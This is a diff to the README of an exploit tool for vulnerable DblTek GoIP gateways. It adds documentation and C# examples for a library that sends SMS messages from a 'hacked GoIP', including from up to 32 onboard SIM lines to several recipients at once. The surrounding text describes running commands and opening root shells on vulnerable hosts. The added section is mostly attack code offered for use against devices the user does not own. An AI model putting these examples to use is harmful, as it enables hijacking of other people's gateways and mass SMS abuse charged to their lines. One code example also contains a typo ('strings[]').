@@ -1,7 +1,7 @@
 # DblTekGoIPPwn
 
 Tool to exploit challenge response system in vulnerable DblTek GoIP devices. Can generate responses to
-specified challenges, test hosts for the vulnerability, run commands on vulnerable hosts, and drop
+specified challenges, test hosts for the vulnerability, run commands on vulnerable hosts, send SMS messages from a host, and drop
 into a root shell on any vulnerable host.
 
 ## The Vulnerability
@@ -171,6 +171,49 @@ results.txt:
 
 The ```False``` or ```True``` after the host indicates whether or not the connection was successfully
 made and the commands delivered.
+
+## Using the DblTekPwn.SMS Library
+
+The code in this GitHub repository provides an abstraction for sending SMS (text) messages from a hacked GoIP. To use this code,
+include DblTekPwn.exe in your application and add the following ```using``` statement.
+
+```C#
+using DblTekPwn.SMS
+```
+
+Now in your code you can use the static ```SmsSender.SendSms``` method. Here are a few examples.
+
+### Sending SMS From a Single Number to a Single Number
+
+```C#
+string[] nums = new string[] { "18005551234" };
+string goIP = "192.168.1.3";
+string msg = "Hello, World!";
+SmsSender.SendSms(goIP, 23, nums, msg);
+```
+
+### Sending SMS From Multiple Numbers to a Single Number
+
+Most GoIPs have up to 32 SIM cards onboard, allowing the hacker to send SMS messages from all of these lines.
+
+```C#
+string[] nums = new string[] { "18005551234" };
+string goIP = "192.168.1.3";
+string msg = "Hai";
+int numbers = 15;
+SmsSender.SendSms(goIP, 23, nums, msg, 1, numbers);
+```
+
+### Sending SMS From Multiple Numbers to Multiple Numbers
+
+```C#
+strings[] nums = new string[] { "18005551234", "18005554321", "18005551337" };
+string goIP = "192.168.1.3";
+string msg = "We are legion";
+int numbers = 32;
+SmsSender.SendSms(goIP, 23, nums, msg, 1, numbers);
+```
+
 
 ## DISCLAIMER
 
